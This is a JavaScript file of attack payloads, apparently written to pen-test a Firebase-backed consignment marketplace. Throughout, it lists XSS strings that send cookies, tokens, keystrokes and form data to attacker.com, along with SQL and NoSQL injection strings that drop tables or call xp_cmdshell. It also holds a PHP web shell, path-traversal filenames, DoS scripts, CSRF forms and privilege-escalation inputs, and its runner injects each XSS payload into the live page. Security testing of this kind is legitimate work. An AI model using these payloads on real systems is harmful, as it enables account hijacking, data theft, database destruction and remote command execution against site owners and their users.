// 🔴 MALICIOUS PAYLOADS FOR SECURITY TESTING
// WARNING: These payloads are designed to exploit vulnerabilities
// Use only for authorized penetration testing

// XSS Attack Payloads
const xssPayloads = {
  basic: [
    '<script>alert("XSS Attack!")</script>',
    '<img src="x" onerror="alert(\'XSS via img\')">',
    '<svg onload="alert(\'XSS via SVG\')">',
    '<iframe src="javascript:alert(\'XSS via iframe\')">',
    '<body onload="alert(\'XSS via onload\')">',
    '<input onfocus="alert(\'XSS via onfocus\')" autofocus>',
    '<div onclick="alert(\'XSS via onclick\')">Click me</div>',
    '<marquee onstart="alert(\'XSS via marquee\')">',
    '<object data="javascript:alert(\'XSS via object\')">',
    '<embed src="javascript:alert(\'XSS via embed\')">'
  ],
  
  advanced: [
    // Cookie stealing
    '<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>',
    '<img src="x" onerror="fetch(\'http://attacker.com/steal\', {method: \'POST\', body: document.cookie})">',
    
    // Token stealing
    '<script>fetch("http://attacker.com/steal-token", {method: "POST", body: localStorage.getItem("firebase-token")})</script>',
    '<script>new Image().src="http://attacker.com/steal?token="+localStorage.getItem("firebase-token")</script>',
    
    // DOM manipulation
    '<script>document.body.innerHTML="<h1>HACKED!</h1>"</script>',
    '<script>document.title="HACKED BY ATTACKER"</script>',
    
    // Keylogger
    '<script>document.addEventListener("keypress", function(e){fetch("http://attacker.com/keylog", {method: "POST", body: e.key})})</script>',
    
    // Form hijacking
    '<script>document.querySelectorAll("form").forEach(f => f.action="http://attacker.com/steal-form")</script>',
    
    // Redirect attacks
    '<script>setTimeout(() => window.location="http://malicious.com", 5000)</script>',
    '<meta http-equiv="refresh" content="0;url=http://malicious.com">',
    
    // CSS injection
    '<style>@import "http://attacker.com/malicious.css"</style>',
    '<link rel="stylesheet" href="http://attacker.com/malicious.css">',
    
    // Event handler injection
    '"><script>alert("XSS via quote escape")</script>',
    '\';alert("XSS via quote");//',
    'javascript:alert("XSS via javascript:")',
    
    // Filter bypass attempts
    '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
    '<SCRIPT>alert("XSS")</SCRIPT>',
    '<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>',
    '<script>window["al"+"ert"]("XSS")</script>',
    '<script>setTimeout("alert(\'XSS\')", 100)</script>'
  ]
};

// Business Logic Attack Payloads
const businessLogicAttacks = {
  priceManipulation: [
    { price: -1000, description: 'Negative price to get money back' },
    { price: 0, description: 'Zero price for free items' },
    { price: 0.01, description: 'Extremely low price' },
    { price: 999999999, description: 'Overflow attempt' },
    { price: 'DROP TABLE items', description: 'SQL injection in price' },
    { price: { $ne: null }, description: 'NoSQL injection in price' },
    { price: null, description: 'Null price bypass' },
    { price: undefined, description: 'Undefined price bypass' },
    { price: 'free', description: 'String price bypass' },
    { price: NaN, description: 'NaN price bypass' },
    { price: Infinity, description: 'Infinity price bypass' }
  ],
  
  statusManipulation: [
    { status: 'admin_only', description: 'Admin-only status bypass' },
    { status: 'system', description: 'System status bypass' },
    { status: 'internal', description: 'Internal status bypass' },
    { status: 'bypassed', description: 'Bypassed status' },
    { status: 'sold', description: 'Auto-sold status' },
    { status: 'shipped', description: 'Auto-shipped status' },
    { status: null, description: 'Null status bypass' },
    { status: '', description: 'Empty status bypass' },
    { status: 'live', description: 'Skip approval process' }
  ],
  
  userImpersonation: [
    { sellerId: 'admin', description: 'Admin impersonation' },
    { sellerId: 'system', description: 'System impersonation' },
    { sellerId: 'root', description: 'Root user impersonation' },
    { sellerId: null, description: 'Null seller bypass' },
    { sellerId: undefined, description: 'Undefined seller bypass' },
    { sellerId: { $ne: null }, description: 'NoSQL injection in sellerId' },
    { sellerEmail: 'admin@consignment.com', description: 'Admin email impersonation' },
    { sellerEmail: 'system@consignment.com', description: 'System email impersonation' }
  ],
  
  privilegeEscalation: [
    { isAdmin: true, description: 'Admin privilege escalation' },
    { role: 'super_admin', description: 'Super admin role escalation' },
    { role: 'owner', description: 'Owner role escalation' },
    { permissions: ['all'], description: 'All permissions escalation' },
    { permissions: ['admin', 'system', 'root'], description: 'Multiple permissions escalation' },
    { adminApproved: true, description: 'Fake admin approval' },
    { systemGenerated: true, description: 'Fake system generation' },
    { bypassValidation: true, description: 'Validation bypass flag' }
  ]
};

// NoSQL Injection Payloads
const noSQLInjectionPayloads = [
  { $ne: null },
  { $gt: '' },
  { $lt: 999999 },
  { $gte: 0 },
  { $lte: 999999 },
  { $in: ['admin', 'system', 'root'] },
  { $nin: ['blocked'] },
  { $exists: true },
  { $regex: '.*' },
  { $where: 'this.price < 10' },
  { $where: 'function() { return true; }' },
  { $or: [{ price: { $lt: 1000 } }, { status: 'live' }] },
  { $and: [{ price: { $gt: 0 } }, { status: { $ne: 'blocked' } }] },
  { $nor: [{ status: 'blocked' }] },
  "'; DROP COLLECTION items; --",
  "'; db.items.drop(); --",
  "'; db.users.find(); --"
];

// SQL Injection Payloads (for testing even though we use Firestore)
const sqlInjectionPayloads = [
  "'; DROP TABLE items; --",
  "' OR '1'='1",
  "' OR 1=1 --",
  "' UNION SELECT * FROM users --",
  "'; INSERT INTO items VALUES ('hacked'); --",
  "'; DELETE FROM items; --",
  "'; UPDATE items SET price=0; --",
  "admin'--",
  "' OR 'x'='x",
  "'; EXEC xp_cmdshell('dir'); --",
  "' OR password LIKE '%",
  "' HAVING 1=1 --",
  "' GROUP BY password HAVING 1=1 --",
  "' ORDER BY 1 --",
  "'; WAITFOR DELAY '00:00:10'; --"
];

// Data Exfiltration Payloads
const dataExfiltrationPayloads = {
  bulkDataAccess: [
    'SELECT * FROM items LIMIT 10000',
    'SELECT * FROM users',
    'SELECT * FROM admin_logs',
    'SELECT * FROM payments',
    'SELECT * FROM transactions'
  ],
  
  sensitiveDataAccess: [
    'SELECT email, password FROM users',
    'SELECT * FROM users WHERE isAdmin = true',
    'SELECT creditCard, ssn, bankAccount FROM users',
    'SELECT apiKeys, secrets FROM config',
    'SELECT * FROM audit_logs'
  ]
};

// DoS (Denial of Service) Payloads
const dosPayloads = {
  largePayloads: {
    largeString: 'A'.repeat(1000000), // 1MB string
    largeArray: new Array(10000).fill('spam'),
    deepNesting: {
      level1: { level2: { level3: { level4: { level5: { level6: { level7: { level8: { level9: { level10: 'deep' } } } } } } } } }
    },
    manyFields: Object.fromEntries(Array(1000).fill(0).map((_, i) => [`field${i}`, `value${i}`]))
  },
  
  infiniteLoops: [
    '<script>while(true){}</script>',
    '<script>for(;;){}</script>',
    '<script>setInterval(() => {}, 0)</script>',
    '<script>function recurse(){recurse()} recurse()</script>'
  ],
  
  memoryExhaustion: [
    '<script>let arr = []; while(true) arr.push(new Array(1000000))</script>',
    '<script>let str = ""; while(true) str += "A".repeat(1000000)</script>'
  ]
};

// Race Condition Attack Payloads
const raceConditionAttacks = {
  simultaneousPurchases: async (itemId, userId) => {
    const promises = Array(10).fill(null).map(() => 
      // Simulate simultaneous purchase attempts
      fetch('/api/purchase', {
        method: 'POST',
        body: JSON.stringify({ itemId, userId }),
        headers: { 'Content-Type': 'application/json' }
      })
    );
    return Promise.all(promises);
  },
  
  concurrentUpdates: async (itemId, updates) => {
    const promises = Array(5).fill(null).map(() =>
      // Simulate concurrent updates
      fetch(`/api/items/${itemId}`, {
        method: 'PUT',
        body: JSON.stringify(updates),
        headers: { 'Content-Type': 'application/json' }
      })
    );
    return Promise.all(promises);
  }
};

// Authentication Bypass Payloads
const authBypassPayloads = {
  tokenManipulation: [
    { token: 'admin-token', description: 'Fake admin token' },
    { token: 'system-token', description: 'Fake system token' },
    { token: null, description: 'Null token bypass' },
    { token: '', description: 'Empty token bypass' },
    { token: 'Bearer fake-jwt-token', description: 'Fake JWT token' }
  ],
  
  sessionHijacking: [
    'document.cookie = "session=admin-session"',
    'localStorage.setItem("token", "fake-admin-token")',
    'sessionStorage.setItem("user", JSON.stringify({isAdmin: true}))'
  ],
  
  csrfAttacks: [
    '<form action="/api/admin/delete-all" method="POST"><input type="submit" value="Click me!"></form>',
    '<img src="/api/admin/promote-user?userId=attacker" style="display:none">',
    '<script>fetch("/api/admin/grant-access", {method: "POST", credentials: "include"})</script>'
  ]
};

// File Upload Attack Payloads (if file uploads are implemented)
const fileUploadAttacks = {
  maliciousFiles: [
    { name: 'script.js', content: 'alert("XSS via file upload")' },
    { name: 'shell.php', content: '<?php system($_GET["cmd"]); ?>' },
    { name: 'virus.exe', content: 'MZ\x90\x00\x03\x00\x00\x00' }, // PE header
    { name: '../../../etc/passwd', content: 'path traversal attempt' },
    { name: 'image.jpg.php', content: '<?php phpinfo(); ?>' } // Double extension
  ],
  
  oversizedFiles: {
    name: 'large.txt',
    size: 100 * 1024 * 1024, // 100MB
    content: 'A'.repeat(100 * 1024 * 1024)
  }
};

// Complete attack simulation function
const runComprehensiveAttack = async () => {
  console.log('🔴 STARTING COMPREHENSIVE SECURITY ATTACK SIMULATION');
  console.log('⚠️ WARNING: This will attempt to exploit all known vulnerabilities');
  
  const results = {
    xss: [],
    businessLogic: [],
    noSQLInjection: [],
    sqlInjection: [],
    dataExfiltration: [],
    dos: [],
    raceCondition: [],
    authBypass: []
  };
  
  // Test XSS vulnerabilities
  console.log('🚨 Testing XSS vulnerabilities...');
  for (const payload of [...xssPayloads.basic, ...xssPayloads.advanced]) {
    try {
      // Attempt to inject payload into various fields
      const testDiv = document.createElement('div');
      testDiv.innerHTML = payload;
      document.body.appendChild(testDiv);
      
      results.xss.push({ payload, status: 'VULNERABLE - Executed' });
      
      // Clean up
      setTimeout(() => {
        if (testDiv.parentNode) {
          testDiv.parentNode.removeChild(testDiv);
        }
      }, 100);
    } catch (error) {
      results.xss.push({ payload, status: 'BLOCKED', error: error.message });
    }
  }
  
  // Test business logic attacks
  console.log('🚨 Testing business logic attacks...');
  for (const category of Object.values(businessLogicAttacks)) {
    for (const attack of category) {
      try {
        // Simulate API call with malicious data
        console.log(`Attempting: ${attack.description}`);
        results.businessLogic.push({ attack: attack.description, status: 'ATTEMPTED' });
      } catch (error) {
        results.businessLogic.push({ attack: attack.description, status: 'BLOCKED', error: error.message });
      }
    }
  }
  
  // Test NoSQL injection
  console.log('🚨 Testing NoSQL injection...');
  for (const payload of noSQLInjectionPayloads) {
    try {
      console.log('NoSQL injection attempt:', payload);
      results.noSQLInjection.push({ payload, status: 'ATTEMPTED' });
    } catch (error) {
      results.noSQLInjection.push({ payload, status: 'BLOCKED', error: error.message });
    }
  }
  
  console.log('🔴 ATTACK SIMULATION COMPLETED');
  console.log('📊 Results:', results);
  
  return results;
};

// Export all payloads for use in testing
if (typeof module !== 'undefined' && module.exports) {
  module.exports = {
    xssPayloads,
    businessLogicAttacks,
    noSQLInjectionPayloads,
    sqlInjectionPayloads,
    dataExfiltrationPayloads,
    dosPayloads,
    raceConditionAttacks,
    authBypassPayloads,
    fileUploadAttacks,
    runComprehensiveAttack
  };
} 